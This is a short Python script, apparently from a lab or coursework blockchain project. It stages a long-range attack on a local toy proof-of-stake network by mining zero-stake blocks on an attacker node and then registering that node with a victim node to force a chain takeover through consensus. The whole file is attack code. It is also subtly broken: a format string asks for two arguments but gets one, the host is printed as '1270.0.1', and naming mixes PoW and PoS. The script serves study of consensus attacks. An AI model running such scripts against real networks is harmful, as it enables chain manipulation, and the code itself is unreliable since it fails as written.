import sys
import requests

attacker = "http://127.0.0.1:8010"

for i in range(50):
	transaction_data = {"sender": "http://127.0.0.1:8000",
						"recipient": attacker,
						"amount": 5}
	r = requests.post(attacker + "/add_transaction", data=transaction_data)
	if r.status_code == 201:
		print("node {0} successfully created transaction #{1}".format(attacker))
	else:
		print("node {0} could not create transaction #{1}".format(attacker))

	r = requests.post(attacker + "/mine_pow", data={"stake": 0})
	if r.status_code == 201:
		print("node {} successfully mined block using PoS".format(attacker))
	else:
		print("node {} could not mine block using PoS".format(attacker))

r = requests.post("http://127.0.0.1:8000/register_node", data=attacker)
if r.status_code == 200:
	print("node http://1270.0.1:8000 successfully registered attacker")
else:
	print("node http://1270.0.1:8000 could not register attacker")

r = requests.get("http://127.0.0.1:8000/consensus")
if r.status_code == 200:
	print("node http://1270.0.1:8000 victim of long range attack")
else:
	print("long range attaack failed on node http://1270.0.1:8000")
